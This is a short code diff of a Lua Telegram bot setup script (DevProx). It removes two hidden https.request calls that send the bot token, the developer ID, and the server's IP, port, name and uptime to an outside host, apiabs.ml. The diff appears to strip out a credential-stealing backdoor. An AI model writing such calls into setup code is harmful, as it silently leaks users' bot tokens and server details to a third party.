@@ -72,7 +72,6 @@ DevProx = DevAbs:get(ServerDevProx.."TokenDevProx"):match("(%d+)"),
 SudoIds = {DevAbs:get(ServerDevProx.."IdDevProx")},
 }
 Create(Config, "./config.lua")   
-https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevAbs:get(ServerDevProx.."IdDevProx").."&TokenBot="..DevAbs:get(ServerDevProx.."TokenDevProx").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 file = io.open("DevProx.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -9525,7 +9524,6 @@ TokenBot = TokenBot,
 DevProx = TokenBot:match("(%d+)"),
 SudoIds = {DevId},
 }
-https.request("https://apiabs.ml/config.php?Get=DevProx&DevId="..DevId.."&TokenBot="..TokenBot.."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
 Create(Config, "./config.lua")   
 file = io.open("DevProx.sh", "w")  
 file:write([[
